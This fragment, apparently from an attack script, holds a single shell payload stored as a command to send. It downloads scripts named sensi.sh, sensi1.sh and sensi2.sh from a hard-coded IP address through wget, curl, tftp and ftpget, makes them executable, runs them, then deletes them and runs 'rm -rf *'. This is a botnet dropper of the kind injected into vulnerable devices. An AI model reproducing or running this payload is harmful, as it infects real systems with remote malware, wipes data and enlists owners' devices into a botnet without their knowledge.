...
cmd="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.42/sensi.sh; curl -O http://87.121.98.42/sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp 87.121.98.42 -c get sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp -r sensi2.sh -g 87.121.98.42; chmod 777 sensi2.sh; sh sensi2.sh; ftpget -v -u anonymous -p anonymous -P 21 87.121.98.42 sensi1.sh sensi1.sh; sh sensi1.sh; rm -rf sensi.sh sensi.sh sensi2.sh sensi1.sh; rm -rf *" #command to send
